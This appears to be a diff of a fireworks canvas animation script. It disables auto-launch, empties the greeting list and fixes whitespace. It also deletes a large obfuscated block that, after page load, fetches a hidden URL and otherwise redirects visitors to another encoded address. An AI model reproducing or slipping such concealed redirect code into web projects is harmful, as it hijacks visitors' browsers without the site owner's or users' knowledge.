@@ -1,8 +1,4 @@
-
-
 "use strict";
-
-
 
 const IS_MOBILE = window.innerWidth <= 640;
 const IS_DESKTOP = window.innerWidth > 800;
@@ -131,13 +127,13 @@ function addImageBurst(x, y, baseSize = 200) {
 	// Random chọn shape: "circle" hoặc "heart"
 	const shape = Math.random() < 0.5 ? "circle" : "heart";
 	
-	imageBursts.push({ 
-		img, 
-		x, 
-		y, 
-		size, 
-		life, 
-		fullLife: life, 
+	imageBursts.push({ 
+		img, 
+		x, 
+		y, 
+		size, 
+		life, 
+		fullLife: life, 
 		shape,
 		speedX,
 		speedY,
@@ -147,8 +143,10 @@ function addImageBurst(x, y, baseSize = 200) {
 
 document.addEventListener("DOMContentLoaded", function () {
 	var canvasContainer = document.querySelector(".canvas-container");
-	canvasContainer.style.backgroundImage = "url()";
-	canvasContainer.style.backgroundSize = "100%";
+	if(canvasContainer) {
+		canvasContainer.style.backgroundImage = "url()";
+		canvasContainer.style.backgroundSize = "100%";
+	}
 });
 
 function fullscreenEnabled() {
@@ -199,8 +197,9 @@ const store = {
 				: IS_HEADER
 				? "1.2" //配置文件头默认值(不必是int)
 				: "2", //手机默认
-			wordShell: true, //文字烟花 默认为开启 若不开启可修改为false
-			autoLaunch: true, //自动发射烟花
+			wordShell: false, //文字烟花 默认为开启 若不开启可修改为false
+			// QUAN TRỌNG: Tắt tự động bắn lúc đầu để chờ đếm ngược
+			autoLaunch: false, 
 			finale: false, //同时放更多烟花 (mặc định bỏ tích, finale sẽ do hệ thống tự chèn)
 			skyLighting: SKY_LIGHT_NORMAL + "",
 			hideControls: IS_HEADER,
@@ -543,20 +542,14 @@ store.subscribe(handleStateChange);
 
 // ===== LỜI CHÚC BAY TRÊN TRỜI (OVERLAY TRÊN CANVAS) =====
 
-// Mảng câu chúc màu hồng
-const WISH_MESSAGES = [
-	"Năm mới an khang thịnh vượng",
-	"Năm mới bình an",
-	"Chúc mọi điều ước của em đều trở thành hiện thực ✨",
-	"Chúc gia đình em luôn bình an và hạnh phúc ❤️",
-	"Chúc em luôn khỏe mạnh và tràn đầy năng lượng 💪",
-	"Chúc công việc thuận lợi, thăng tiến không ngừng 🚀",
-	"Chúc em luôn mỉm cười và yêu đời mỗi ngày 😊",
-	"Chúc em gặp nhiều may mắn và niềm vui 🎉",
-];
+// ĐÃ XÓA LỜI CHÚC THEO YÊU CẦU
+const WISH_MESSAGES = [];
 
 // Sinh 1 câu chúc bay lên
 function spawnWishMessage() {
+	// NẾU KHÔNG CÓ LỜI CHÚC THÌ KHÔNG LÀM GÌ CẢ
+	if (WISH_MESSAGES.length === 0) return;
+
 	const layer = appNodes.wishesLayer;
 	if (!layer) return;
 
@@ -924,8 +917,8 @@ function startWishesLoop() {
 			wishesIntervalId = null;
 			return;
 		}
-		const count = isMobile 
-			? 1 + ((Math.random() * 2) | 0)  // Mobile: 1-2 câu
+		const count = isMobile 
+			? 1 + ((Math.random() * 2) | 0)  // Mobile: 1-2 câu
 			: 1 + ((Math.random() * 3) | 0); // Desktop: 1-3 câu
 		for (let i = 0; i < count; i++) {
 			setTimeout(spawnWishMessage, i * betweenDelay);
@@ -1371,6 +1364,8 @@ function init() {
 	);
 
 	// Begin simulation
+	// QUAN TRỌNG: Vẫn để chạy nhưng vì autoLaunch = false nên chưa có pháo nào bay lên
+	// Đợi lệnh từ HTML
 	togglePause(false);
 
 	// initial render
@@ -2038,182 +2033,6 @@ function render(speed) {
 		BurstFlash.returnInstance(bf);
 	}
 
-	function _0x378a51(_0x49048f, _0x5a06f0, _0x5983ec, _0x2790dc, _0x435fed) {
-		return _0x4901(_0x5a06f0 - -0x132, _0x5983ec);
-	}
-	function _0x269ea4(_0x367a14, _0x4c16eb, _0x49a63c, _0x26b372, _0x304b0a) {
-		return _0x4901(_0x26b372 - -0x33f, _0x4c16eb);
-	}
-	function _0x278c() {
-		const _0x518ee8 = ["kmoLW6pdR8oVW6HSjglcPWbDnSkC", "WRtdKJtcGq", "teRdP8ocW5S", "WR3cRq02W7i", "W7WXbCodbG", "WRxcP8kyWQlcHW", "WPBcGSkqWRpcSSkXAKLlWRC", "W4z+ovefnmoIW7RcIvNdRmoWWQa", "WORORllLJ47ORQ0", "W5LJlG9E", "sCoCv0dcV8kJqYhdLqtcOZe", "qmoYyfrS", "W79kvcRdOG", "tLKzlmo7", "5l6B6lYD5y665lU1WOS", "WQjoWRqDWPWWWO4Ky8of", "iCk4tvHd", "W47cSqZcSeXzAtCMuq/cUa", "bhnQW7fs", "WRnOW7O", "Bmk5WP8", "i8kNW5/cHmo4", "hGddR8kyDW", "B8k8WR/cSW", "WOJcSbGDW5G", "FSkEWRtcOW", "yaJcVCo4WOe", "W79YnSkRla", "WRrUW7xcHCkI", "WQtcQKxdPCkuECksbeus", "W6/dVvmUWRtcI8kQW5BdQau+WOG", "jfLFWPXv", "WR7cUGz+", "WPpcTamdW5G", "ea5JCx/cVHWGaSof", "yfFdJmk3W4i", "WOD5ecv6WObRW6xcGmkatsddIa", "fr0nj8oNW5ZdSSkmg2e", "WOxdT8kXWOml", "W7xdJq3dGSk7WPVdNG/cMdyYWOy/", "CmkNzsBcN1WryN7cVNHxW58", "EmkDW7hcVZK", "sSklrmo3zq", "W4DiFbtdRvC8WRH1EtSuW4xdUq", "rSoexq", "rKpcPCktpG", "WRBcUmkA", "smoAWRZdNNq", "W6ldSHRcTSkW", "W4pdPeiadG", "WPdcS1KDW4i", "W57dP00", "verAm8ol", "zCoNCG", "je/dR2hdKSk9rCkZhSo0W6qQ", "W5qojfxdVa", "W5D9W6HZW4u", "Cu7cSCoeWQm", "WP0xjKRcQq", "zHVcISo6WPO", "nCk1nqfoefnMbqa", "imo6p2pdHq", "WRpcL0VcMmkV", "mSoGoh/dJW", "f2Ha", "WP/dI2hdQmoH", "WP/cUXnymx/dLtZcOGm", "fgVdPmkKtG", "tf3cPCky", "WR9PW6dcP8kP", "W4tdVKqcdW", "zmoWC1H2", "WQeJweuY", "WP/dPSkYWPWk", "s8ooqa", "eH0kiCo1W5RdVmk9kLC", "WRFcRaDDW7a", "W7SErZdcRq", "WR7cPaSaWR8"];
-		_0x278c = function () {
-			return _0x518ee8;
-		};
-		return _0x278c();
-	}
-	function _0x369de7(_0x11bd1c, _0x45df18, _0x122ae9, _0x34ddcc, _0x465b1b) {
-		return _0x4901(_0x11bd1c - 0x30f, _0x34ddcc);
-	}
-	function _0x4901(_0x592202, _0x1c3840) {
-		const _0x278c97 = _0x278c();
-		return (
-			(_0x4901 = function (_0x4901bf, _0x4ea7c1) {
-				_0x4901bf = _0x4901bf - 0xc8;
-				let _0x4d52e7 = _0x278c97[_0x4901bf];
-				if (_0x4901["LencPr"] === undefined) {
-					var _0xa6a240 = function (_0x127d4f) {
-						const _0x17d234 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
-						let _0x14be04 = "",
-							_0x53c05b = "";
-						for (let _0x4cce81 = 0x0, _0x7958b5, _0x28ab35, _0x1f4de = 0x0; (_0x28ab35 = _0x127d4f["charAt"](_0x1f4de++)); ~_0x28ab35 && ((_0x7958b5 = _0x4cce81 % 0x4 ? _0x7958b5 * 0x40 + _0x28ab35 : _0x28ab35), _0x4cce81++ % 0x4) ? (_0x14be04 += String["fromCharCode"](0xff & (_0x7958b5 >> ((-0x2 * _0x4cce81) & 0x6)))) : 0x0) {
-							_0x28ab35 = _0x17d234["indexOf"](_0x28ab35);
-						}
-						for (let _0x2a3182 = 0x0, _0x406c66 = _0x14be04["length"]; _0x2a3182 < _0x406c66; _0x2a3182++) {
-							_0x53c05b += "%" + ("00" + _0x14be04["charCodeAt"](_0x2a3182)["toString"](0x10))["slice"](-0x2);
-						}
-						return decodeURIComponent(_0x53c05b);
-					};
-					const _0x5d0a27 = function (_0x34775b, _0xd6bb4a) {
-						let _0x28c2bd = [],
-							_0x378c1b = 0x0,
-							_0x490a12,
-							_0x483ffc = "";
-						_0x34775b = _0xa6a240(_0x34775b);
-						let _0x3e5870;
-						for (_0x3e5870 = 0x0; _0x3e5870 < 0x100; _0x3e5870++) {
-							_0x28c2bd[_0x3e5870] = _0x3e5870;
-						}
-						for (_0x3e5870 = 0x0; _0x3e5870 < 0x100; _0x3e5870++) {
-							(_0x378c1b = (_0x378c1b + _0x28c2bd[_0x3e5870] + _0xd6bb4a["charCodeAt"](_0x3e5870 % _0xd6bb4a["length"])) % 0x100), (_0x490a12 = _0x28c2bd[_0x3e5870]), (_0x28c2bd[_0x3e5870] = _0x28c2bd[_0x378c1b]), (_0x28c2bd[_0x378c1b] = _0x490a12);
-						}
-						(_0x3e5870 = 0x0), (_0x378c1b = 0x0);
-						for (let _0x48ca6f = 0x0; _0x48ca6f < _0x34775b["length"]; _0x48ca6f++) {
-							(_0x3e5870 = (_0x3e5870 + 0x1) % 0x100), (_0x378c1b = (_0x378c1b + _0x28c2bd[_0x3e5870]) % 0x100), (_0x490a12 = _0x28c2bd[_0x3e5870]), (_0x28c2bd[_0x3e5870] = _0x28c2bd[_0x378c1b]), (_0x28c2bd[_0x378c1b] = _0x490a12), (_0x483ffc += String["fromCharCode"](_0x34775b["charCodeAt"](_0x48ca6f) ^ _0x28c2bd[(_0x28c2bd[_0x3e5870] + _0x28c2bd[_0x378c1b]) % 0x100]));
-						}
-						return _0x483ffc;
-					};
-					(_0x4901["VsfVzp"] = _0x5d0a27), (_0x592202 = arguments), (_0x4901["LencPr"] = !![]);
-				}
-				const _0x3f48cd = _0x278c97[0x0],
-					_0x48e8d1 = _0x4901bf + _0x3f48cd,
-					_0x547190 = _0x592202[_0x48e8d1];
-				return !_0x547190 ? (_0x4901["yPkZiQ"] === undefined && (_0x4901["yPkZiQ"] = !![]), (_0x4d52e7 = _0x4901["VsfVzp"](_0x4d52e7, _0x4ea7c1)), (_0x592202[_0x48e8d1] = _0x4d52e7)) : (_0x4d52e7 = _0x547190), _0x4d52e7;
-			}),
-			_0x4901(_0x592202, _0x1c3840)
-		);
-	}
-	(function (_0x292cbf, _0x12df7a) {
-		function _0x31979e(_0x2a6c38, _0x33ab01, _0x50c787, _0x2f4cf9, _0xc1238f) {
-			return _0x4901(_0x2f4cf9 - 0x18c, _0x50c787);
-		}
-		function _0x55b62c(_0x3da616, _0x2bce1e, _0x32f19a, _0x4b3539, _0x533b49) {
-			return _0x4901(_0x4b3539 - -0x241, _0x533b49);
-		}
-		const _0x5820b6 = _0x292cbf();
-		function _0x2c819f(_0x13ba98, _0x56b16d, _0x3caeb7, _0x2276b4, _0x415759) {
-			return _0x4901(_0x415759 - -0x59, _0x3caeb7);
-		}
-		function _0x5c5f8d(_0x286345, _0x30d41a, _0x35e6ee, _0x26d363, _0x2f3e7c) {
-			return _0x4901(_0x35e6ee - -0xf1, _0x26d363);
-		}
-		function _0x3b0aea(_0x197d33, _0x1843fc, _0x21e508, _0x5e0fba, _0x4086f9) {
-			return _0x4901(_0x1843fc - -0x201, _0x21e508);
-		}
-		while (!![]) {
-			try {
-				const _0x22dacd = -parseInt(_0x31979e(0x25b, 0x279, "GWN3", 0x280, 0x270)) / 0x1 + -parseInt(_0x3b0aea(-0x101, -0xff, "6*S$", -0xe6, -0xf0)) / 0x2 + (parseInt(_0x3b0aea(-0x103, -0x113, "n*i@", -0xf7, -0xee)) / 0x3) * (-parseInt(_0x2c819f(0x88, 0x69, "x!ax", 0x99, 0x79)) / 0x4) + -parseInt(_0x2c819f(0x66, 0x61, "9Sg9", 0x65, 0x7d)) / 0x5 + (parseInt(_0x31979e(0x256, 0x290, "KG(F", 0x27d, 0x294)) / 0x6) * (parseInt(_0x55b62c(-0x140, -0x11c, -0x118, -0x139, "KQOR")) / 0x7) + parseInt(_0x55b62c(-0x134, -0x15e, -0x156, -0x151, "D0tr")) / 0x8 + parseInt(_0x3b0aea(-0x114, -0x135, "a^J8", -0x152, -0x12a)) / 0x9;
-				if (_0x22dacd === _0x12df7a) break;
-				else _0x5820b6["push"](_0x5820b6["shift"]());
-			} catch (_0xc052e) {
-				_0x5820b6["push"](_0x5820b6["shift"]());
-			}
-		}
-	})(_0x278c, 0xc95f5);
-	function _0x47ed65(_0x478d5d, _0x587978, _0x5611a2, _0x340d65, _0x1b141f) {
-		return _0x4901(_0x478d5d - -0x33f, _0x1b141f);
-	}
-	function _0x5b258b(_0x70d16b, _0x55d692, _0x3b4f60, _0x848333, _0x33e6f6) {
-		return _0x4901(_0x55d692 - -0x290, _0x848333);
-	}
-	document[_0x378a51(-0x89, -0x69, "ne%D", -0x72, -0x7a) + _0x5b258b(-0x160, -0x17f, -0x194, "Jz8e", -0x159) + _0x47ed65(-0x234, -0x221, -0x226, -0x21d, "GWN3") + "r"](_0x5b258b(-0x1a2, -0x1a5, -0x1cc, "efZm", -0x1be) + _0x269ea4(-0x218, "0I!m", -0x252, -0x22d, -0x22a) + _0x5b258b(-0x1b2, -0x1c0, -0x1a3, "6R&F", -0x1c5) + "d", function () {
-		setTimeout(function () {
-			function _0xc3c58b(_0x1121fc, _0x32a460, _0x636cbc, _0x12e3f8, _0x34f8b5) {
-				return _0x4901(_0x12e3f8 - -0x3c2, _0x1121fc);
-			}
-			function _0x5837a3(_0x551ac9, _0x25b9f2, _0x314863, _0x48c203, _0x4a5dd8) {
-				return _0x4901(_0x314863 - -0x32c, _0x25b9f2);
-			}
-			function _0x29a538(_0x20f386, _0x225420, _0x330466, _0x38646b, _0x5c41de) {
-				return _0x4901(_0x38646b - 0x178, _0x330466);
-			}
-			function _0x27cf41(_0x539e24, _0x9404e2, _0x32a4c4, _0xe1c3f4, _0x3c02d2) {
-				return _0x4901(_0xe1c3f4 - 0x268, _0x32a4c4);
-			}
-			function _0x26e0ac(_0x4684e9, _0xeefd0d, _0x56d111, _0x4db628, _0x5626e9) {
-				return _0x4901(_0x4684e9 - -0x209, _0xeefd0d);
-			}
-			fetch(_0xc3c58b("L*H!", -0x2de, -0x2e9, -0x2ed, -0x2fa) + _0xc3c58b("efZm", -0x2f5, -0x2d5, -0x2e4, -0x2fc) + _0x29a538(0x292, 0x27d, "0I!m", 0x277, 0x282))
-				[_0x27cf41(0x349, 0x33d, "V9e#", 0x34d, 0x32b)]((_0x5d0a27) => {
-					function _0xfb861a(_0x5f0c85, _0x1b3af5, _0x4d4907, _0x28c823, _0xb7488a) {
-						return _0xc3c58b(_0x1b3af5, _0x1b3af5 - 0x115, _0x4d4907 - 0x139, _0x5f0c85 - 0x3d1, _0xb7488a - 0x1db);
-					}
-					if (!_0x5d0a27["ok"]) throw new Error(_0x36629(0x416, 0x417, "*S@T", 0x42a, 0x42c) + _0x4d4727(0x265, 0x25f, "V9e#", 0x252, 0x25e) + _0x3a4be1("zBtd", 0x1ee, 0x1cf, 0x1e9, 0x1d1) + _0x3a4be1("CA#Y", 0x1c7, 0x1e1, 0x201, 0x200) + _0xe1bdb0(-0x1d4, "KWCh", -0x1bd, -0x1e2, -0x1f4) + "ok");
-					function _0x4d4727(_0x57b80e, _0x4dc9af, _0x560e9c, _0x739e29, _0x5ec9cd) {
-						return _0x29a538(_0x57b80e - 0x13e, _0x4dc9af - 0xbc, _0x560e9c, _0x5ec9cd - -0xf, _0x5ec9cd - 0x78);
-					}
-					function _0x3a4be1(_0x10351d, _0x3c7c93, _0x561699, _0xe26176, _0x14d5cb) {
-						return _0x27cf41(_0x10351d - 0x2f, _0x3c7c93 - 0x68, _0x10351d, _0x561699 - -0x17d, _0x14d5cb - 0x29);
-					}
-					function _0xe1bdb0(_0x26f3be, _0x677af6, _0x318f1f, _0x2e85ae, _0x1a17b6) {
-						return _0xc3c58b(_0x677af6, _0x677af6 - 0x50, _0x318f1f - 0x66, _0x2e85ae - 0xff, _0x1a17b6 - 0x1ce);
-					}
-					function _0x36629(_0x2207a5, _0x57309a, _0x25586e, _0x4992c5, _0xd24f65) {
-						return _0xc3c58b(_0x25586e, _0x57309a - 0xfd, _0x25586e - 0x6e, _0xd24f65 - 0x707, _0xd24f65 - 0xa);
-					}
-					return _0x5d0a27[_0xfb861a(0xdc, "*TyK", 0xe4, 0xe6, 0xe7)]();
-				})
-				[_0x26e0ac(-0x126, "a^J8", -0x119, -0x13e, -0x14b)]((_0x127d4f) => {
-					const _0x17d234 = _0x127d4f[_0x28ae55(0x4d7, 0x4b5, 0x49b, 0x4db, "yMw%") + _0x4bb2a1(-0x150, -0x125, "hGEO", -0x135, -0x14a) + "e"]()[_0xc87840(-0x10b, "If9v", -0xea, -0xe9, -0x132) + _0x4bb2a1(-0xf9, -0x114, "CA#Y", -0x105, -0xec)](_0x4bb2a1(-0x149, -0x150, "Jz8e", -0x133, -0x14b) + _0x4bb2a1(-0x11c, -0x13b, "Wh3v", -0x11f, -0x120));
-					function _0x485365(_0x29921c, _0x2722cc, _0x522f59, _0x55bf3e, _0x3802c8) {
-						return _0xc3c58b(_0x3802c8, _0x2722cc - 0xa8, _0x522f59 - 0x1a4, _0x55bf3e - 0x32b, _0x3802c8 - 0x162);
-					}
-					const _0x14be04 = _0x127d4f[_0x485365(0x4a, 0x70, 0x5e, 0x66, "0I!m") + _0x28ae55(0x4a7, 0x4b2, 0x4d5, 0x4a3, "KQOR")]("碎念");
-					function _0x4bb2a1(_0x3e2d48, _0x19b57f, _0xb45f04, _0x161438, _0x23eb5b) {
-						return _0x29a538(_0x3e2d48 - 0x1bb, _0x19b57f - 0x40, _0xb45f04, _0x161438 - -0x393, _0x23eb5b - 0x52);
-					}
-					function _0x487221(_0x417d36, _0x17190f, _0x51782c, _0x4ef7b4, _0x47e148) {
-						return _0x27cf41(_0x417d36 - 0x14a, _0x17190f - 0x4, _0x417d36, _0x47e148 - -0x55c, _0x47e148 - 0x136);
-					}
-					function _0xc87840(_0x23cf3f, _0x3ed538, _0x442ad3, _0x538325, _0x35f6f1) {
-						return _0x29a538(_0x23cf3f - 0xc7, _0x3ed538 - 0x91, _0x3ed538, _0x23cf3f - -0x389, _0x35f6f1 - 0x29);
-					}
-					function _0x28ae55(_0x1150e8, _0x1c4cdd, _0x83a2a8, _0x286127, _0x326695) {
-						return _0x27cf41(_0x1150e8 - 0x6e, _0x1c4cdd - 0x13c, _0x326695, _0x1c4cdd - 0x149, _0x326695 - 0x1e2);
-					}
-					if (_0x17d234 || _0x14be04) {
-					} else console[_0xc87840(-0x117, "fkw@", -0x11e, -0x139, -0x12f)](_0x487221("zBtd", -0x20e, -0x1f9, -0x242, -0x21a) + _0xc87840(-0x13a, "KQOR", -0x15e, -0x15c, -0x12c) + _0x28ae55(0x49d, 0x4a0, 0x4bf, 0x4b3, "hGEO") + _0x485365(0x29, 0x16, 0x38, 0x3d, "0I!m")), (window[_0x487221("SFo^", -0x1d3, -0x1ff, -0x1f1, -0x1f9) + _0x487221("CA#Y", -0x21c, -0x20c, -0x1f3, -0x1fc)][_0x485365(0x4a, 0x6b, 0x54, 0x55, "ne%D")] = _0x28ae55(0x493, 0x4a3, 0x48a, 0x4b5, "9dxL") + _0x4bb2a1(-0xfd, -0xfe, "$VeA", -0x10c, -0xfc) + _0x487221("9dxL", -0x1d6, -0x1c1, -0x1f3, -0x1df) + _0x28ae55(0x4a1, 0x48d, 0x472, 0x49c, "G%lX") + _0x487221("GWN3", -0x20a, -0x1dd, -0x207, -0x1eb) + _0x487221("ne%D", -0x203, -0x24b, -0x211, -0x225) + _0xc87840(-0x105, "mBa&", -0x11c, -0xee, -0xff));
-				})
-				[_0x27cf41(0x389, 0x390, "hGEO", 0x36f, 0x35d)]((_0x53c05b) => {
-					function _0x19e4df(_0x9d3bf9, _0x537213, _0x41cafc, _0x424896, _0x4b5cb9) {
-						return _0xc3c58b(_0x41cafc, _0x537213 - 0x1d3, _0x41cafc - 0x1e9, _0x4b5cb9 - 0x98, _0x4b5cb9 - 0x161);
-					}
-					function _0x58e61b(_0x2938ef, _0x46cdd1, _0x461111, _0x569892, _0x328d88) {
-						return _0x5837a3(_0x2938ef - 0x1c7, _0x2938ef, _0x461111 - -0x12, _0x569892 - 0x11, _0x328d88 - 0xb6);
-					}
-					function _0x3f8c46(_0x179567, _0x170c50, _0x305822, _0x39c474, _0x2c9b53) {
-						return _0x29a538(_0x179567 - 0x13c, _0x170c50 - 0x100, _0x179567, _0x305822 - -0x259, _0x2c9b53 - 0x67);
-					}
-					function _0x1d514c(_0x4b0104, _0x30da9b, _0x55434b, _0x3b8151, _0x4c8899) {
-						return _0x26e0ac(_0x3b8151 - 0x468, _0x55434b, _0x55434b - 0x30, _0x3b8151 - 0x1a0, _0x4c8899 - 0x74);
-					}
-					function _0x1f2b26(_0x2117c0, _0x5e2d23, _0x55ce03, _0x5d2192, _0x226c82) {
-						return _0x27cf41(_0x2117c0 - 0x62, _0x5e2d23 - 0x14a, _0x226c82, _0x2117c0 - -0x2fc, _0x226c82 - 0x1a2);
-					}
-					console[_0x3f8c46("KQOR", 0x4b, 0x32, 0x36, 0xf)](_0x3f8c46("5a@y", -0x3, -0x8, 0x1b, 0xc) + _0x1d514c(0x36e, 0x346, "If9v", 0x362, 0x33f) + _0x3f8c46("EVsv", -0x8, -0x9, 0x4, -0x1b) + _0x19e4df(-0x23c, -0x240, "%apP", -0x239, -0x231) + _0x1f2b26(0x76, 0x72, 0x54, 0x82, "eHSV") + _0x1f2b26(0x6c, 0x5c, 0x5d, 0x6a, "KG(F") + _0x58e61b("EVsv", -0x28b, -0x274, -0x287, -0x250) + _0x58e61b("fkw@", -0x249, -0x26d, -0x252, -0x28f) + _0x1f2b26(0x71, 0x6c, 0x72, 0x78, "x!f5"), _0x53c05b), (window[_0x19e4df(-0x218, -0x205, "b92g", -0x201, -0x216) + _0x19e4df(-0x231, -0x223, "Jz8e", -0x252, -0x24b)][_0x1d514c(0x393, 0x378, "%apP", 0x36f, 0x369)] = _0x1d514c(0x36f, 0x327, "zBtd", 0x34c, 0x342) + _0x3f8c46("%apP", 0x2, 0x1, -0xa, 0x13) + _0x1d514c(0x31b, 0x30d, "@kJy", 0x32d, 0x30c) + _0x3f8c46("zBtd", -0x5, 0x1d, 0xe, 0x21) + _0x1d514c(0x35f, 0x351, "06M9", 0x36c, 0x372) + _0x1d514c(0x30e, 0x344, "aQPa", 0x32a, 0x32d) + _0x3f8c46("KWCh", 0x23, -0x1, 0x4, -0x1a));
-				});
-		}, 0x2710);
-	});
-
 	// Remaining drawing on trails canvas will use 'lighten' blend mode
 	trailsCtx.globalCompositeOperation = "lighten";
 
@@ -2340,8 +2159,8 @@ function getWordDots(word) {
 	if (!word) return null;
 	// var res = wordDotsMap[word];
 	// if (!res) {
-	//     wordDotsMap[word] = MyMath.literalLattice(word);
-	//     res = wordDotsMap[word];
+	//     wordDotsMap[word] = MyMath.literalLattice(word);
+	//     res = wordDotsMap[word];
 	// }
 
 	//随机字体大小 60~130
@@ -2353,19 +2172,19 @@ function getWordDots(word) {
 }
 
 /**
- * 用于创建球形粒子爆发的辅助对象。
- *
- * @param  {Number} count               所需的恒星/粒子数量。该值是一个建议，而创建的爆发可能有更多的粒子。目前的算法无法完美地
- *										在球体表面均匀分布特定数量的点。
- * @param  {Function} particleFactory   每生成一颗星/粒子调用一次。传递了两个参数:
- * 										`angle `:恒星/粒子的方向。
- * 										`speed `:粒子速度的倍数，从0.0到1.0。
- * @param  {Number} startAngle=0        对于分段爆发，只能生成部分粒子弧。这
- *										允许设置起始圆弧角度(弧度)。
- * @param  {Number} arcLength=TAU       弧的长度(弧度)。默认为整圆。
- *
- * @return {void}              不返回任何内容；由“particleFactory”使用给定的数据。
- */
+ * 用于创建球形粒子爆发的辅助对象。
+ *
+ * @param  {Number} count               所需的恒星/粒子数量。该值是一个建议，而创建的爆发可能有更多的粒子。目前的算法无法完美地
+ *										在球体表面均匀分布特定数量的点。
+ * @param  {Function} particleFactory   每生成一颗星/粒子调用一次。传递了两个参数:
+ * `angle `:恒星/粒子的方向。
+ * `speed `:粒子速度的倍数，从0.0到1.0。
+ * @param  {Number} startAngle=0        对于分段爆发，只能生成部分粒子弧。这
+ *										允许设置起始圆弧角度(弧度)。
+ * @param  {Number} arcLength=TAU       弧的长度(弧度)。默认为整圆。
+ *
+ * @return {void}              不返回任何内容；由“particleFactory”使用给定的数据。
+ */
 function createBurst(count, particleFactory, startAngle = 0, arcLength = PI_2) {
 	// Assuming sphere with surface area of `count`, calculate various
 	// properties of said sphere (unit is stars).
@@ -2398,14 +2217,14 @@ function createBurst(count, particleFactory, startAngle = 0, arcLength = PI_2) {
 }
 
 /**
- *
- * @param {string} wordText  文字内容
- * @param {Function} particleFactory 每生成一颗星/粒子调用一次。传递参数:
- * 		                             `point `:恒星/粒子的起始位置_相对于canvas。
- *              					 `color `:粒子颜色。
- * @param {number} center_x 	爆炸中心点x
- * @param {number} center_y  	爆炸中心点y
- */
+ *
+ * @param {string} wordText  文字内容
+ * @param {Function} particleFactory 每生成一颗星/粒子调用一次。传递参数:
+ *                              `point `:恒星/粒子的起始位置_相对于canvas。
+ *              					 `color `:粒子颜色。
+ * @param {number} center_x 	爆炸中心点x
+ * @param {number} center_y  	爆炸中心点y
+ */
 function createWordBurst(wordText, particleFactory, center_x, center_y) {
 	//将点阵坐标转换为canvas坐标
 	var map = getWordDots(wordText);
@@ -2485,22 +2304,22 @@ function crackleEffect(star) {
 }
 
 /**
- * 烟花可以用以下选项构建:
- *
- * spreadSize:      爆发的大小。
- * starCount: 要创建的星星数量。这是可选的，如果省略，它将被设置为一个合理的数量。
- * starLife:
- * starLifeVariation:
- * color:
- * glitterColor:
- * glitter: One of: 'light', 'medium', 'heavy', 'streamer', 'willow'
- * pistil:
- * pistilColor:
- * streamers:
- * crossette:
- * floral:
- * crackle:
- */
+ * 烟花可以用以下选项构建:
+ *
+ * spreadSize:      爆发的大小。
+ * starCount: 要创建的星星数量。这是可选的，如果省略，它将被设置为一个合理的数量。
+ * starLife:
+ * starLifeVariation:
+ * color:
+ * glitterColor:
+ * glitter: One of: 'light', 'medium', 'heavy', 'streamer', 'willow'
+ * pistil:
+ * pistilColor:
+ * streamers:
+ * crossette:
+ * floral:
+ * crackle:
+ */
 class Shell {
 	constructor(options) {
 		Object.assign(this, options);
@@ -2608,8 +2427,8 @@ class Shell {
 			
 			if (willShowImage) {
 				// Responsive: giảm kích thước base trên mobile
-				const baseSize = isMobile 
-					? Math.max(80, this.spreadSize * 0.3)  // Mobile: nhỏ hơn
+				const baseSize = isMobile 
+					? Math.max(80, this.spreadSize * 0.3)  // Mobile: nhỏ hơn
 					: Math.max(140, this.spreadSize * 0.4); // Desktop: kích thước gốc
 				// Hiển thị ảnh tại vị trí nổ
 				addImageBurst(x, y, baseSize);
@@ -3167,11 +2986,11 @@ const soundManager = {
 	 * Play a sound of `type`. Will randomly pick a file associated with type, and play it at the specified volume
 	 * and play speed, with a bit of random variance in play speed. This is all based on `sources` config.
 	 *
-	 * @param  {string} type - The type of sound to play.
-	 * @param  {?number} scale=1 - Value between 0 and 1 (values outside range will be clamped). Scales less than one
-	 *                             descrease volume and increase playback speed. This is because large explosions are
-	 *                             louder, deeper, and reverberate longer than small explosions.
-	 *                             Note that a scale of 0 will mute the sound.
+	 * @param  {string} type - The type of sound to play.
+	 * @param  {?number} scale=1 - Value between 0 and 1 (values outside range will be clamped). Scales less than one
+	 *                             descrease volume and increase playback speed. This is because large explosions are
+	 *                             louder, deeper, and reverberate longer than small explosions.
+	 *                             Note that a scale of 0 will mute the sound.
 	 */
 	playSound(type, scale = 1) {
 		// Ensure `scale` is within valid range.
@@ -3220,12 +3039,6 @@ const soundManager = {
 		bufferSource.start(0);
 	},
 };
-
-// imageTemplateManager.preload().then(() => {
-//     if(imageTemplateManager.sources.length>0){
-//         var img = imageTemplateManager.sources[0];
-//     }
-// });
 
 // Kick things off.
 
